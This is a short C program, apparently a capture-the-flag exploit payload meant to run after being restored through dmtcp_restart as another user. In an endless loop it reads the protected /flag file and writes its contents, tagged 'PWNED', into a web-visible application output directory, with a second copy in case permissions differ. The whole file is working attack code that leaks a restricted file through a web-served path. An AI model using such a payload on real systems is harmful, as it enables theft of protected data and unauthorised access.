/* Restored by dmtcp_restart as user `prime`. Reads the group-readable /flag
 * and writes it to the web-visible output file, in a loop so timing/cwd on
 * the remote don't matter. Opens fresh fds each iteration (checkpoint-safe). */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(void) {
    for (;;) {
        FILE *f = fopen("/flag", "r");
        if (f) {
            char buf[1024];
            size_t n = fread(buf, 1, sizeof(buf) - 1, f);
            fclose(f);
            if (n > 0) {
                /* DATA_DIR=/app/data on the remote */
                FILE *o = fopen("/app/data/output/latest.txt", "w");
                if (o) {
                    fwrite("PWNED ", 1, 6, o);
                    fwrite(buf, 1, n, o);
                    fclose(o);
                }
                /* also stash a copy in case output dir perms differ */
                FILE *o2 = fopen("/app/data/output/status.txt", "w");
                if (o2) { fwrite(buf, 1, n, o2); fclose(o2); }
            }
        }
        usleep(100000);
    }
    return 0;
}
